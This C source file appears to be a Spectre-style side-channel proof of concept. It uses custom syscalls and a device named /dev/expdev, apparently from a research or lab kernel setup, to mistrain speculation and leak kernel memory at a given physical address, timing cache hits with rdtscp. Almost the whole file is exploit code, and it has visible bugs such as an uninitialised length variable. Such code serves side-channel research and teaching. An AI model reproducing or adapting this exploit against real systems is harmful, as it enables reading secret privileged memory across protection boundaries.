
#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<linux/kernel.h>
#include<sys/syscall.h>
#include<sys/mman.h>
#include<unistd.h>
#include<fcntl.h>

#define D_MMAP_LEN 256
#define D_PAGE_SIZE 4096
#define MAX_TRIES 1000
#define TRAIN_TIMES 100

int mresult;
uint8_t array2[D_MMAP_LEN * D_PAGE_SIZE];

#define CACHE_HIT_THRESHOLD (40)

void readMemoryByte(uint8_t value[2], int score[2], size_t mx, size_t my){
    static int results[256];
    int tries, i, j, k, mix_i, junk = 0;
    size_t x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++)
        results[i] = 0;    
    
    for (tries = MAX_TRIES; tries > 0; tries--) {
        for(j = 29 ; j >= 0 ; --j){
            if((j % 6) == 0){
                x = mx;
            } else {
                x = 0;
            }
            // Sceptre
            syscall(223, x, my);
        }

       for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];
            time1 = __rdtscp(&junk);         /* READ TIMER */
            junk = *addr;                    /* MEMORY ACCESS TO TIME */
            time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
            if (time2 <= CACHE_HIT_THRESHOLD) // && mix_i != array1[tries % array1_size])
                results[mix_i]++; /* cache hit - add +1 to score for this value */
        }

        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if (results[j] >= (1.2 * results[k] + 3) || (results[j] == 2 && results[k] == 0))
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    }
    results[0] ^= junk; /* use junk so code above won’t get optimized out*/
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main(int argc, const char **argv)
{
    int i;
    int score[2], len;
    uint8_t value[2];
    size_t karr1, karr2, secret_phy_addr, secret_ker_vir, prob_ker_vir;
    size_t malicious_x, malicious_y;
    int fd;
    // int junk = 0;
    // register uint64_t time1, time2;

    fd = open("/dev/expdev", O_RDWR);
    if(fd < 0){
        perror("Fail Open File.\n");
        return -1;
    }
    
    mresult = mmap(NULL, D_MMAP_LEN * D_PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if(mresult == MAP_FAILED){
        perror("Fail to MMAP.\n");
        return -1;
    }

    karr1 = syscall(224, 1);
    karr2 = syscall(224, 2);
    sscanf(argv[1], "%lx", &secret_phy_addr);
    secret_ker_vir = syscall(224, secret_phy_addr);

    for( i = 0 ; i < 256 * 4096 ; ++i)
        ; // 
    
    malicious_x = secret_ker_vir - karr1;
    malicious_y = 0x0 - karr2;

    printf("Reading %d bytes:\n", len);
    while (--len >= 0) {
        printf("Reading at malicious_x = %p... ", (void *)malicious_x);
        readMemoryByte(value, score, malicious_x ++, malicious_y);
        printf("%s: ", (score[0] >= 1.2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X=’%c’ score=%d ", value[0],
                (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
	printf("\n");
    }

    return 0;
}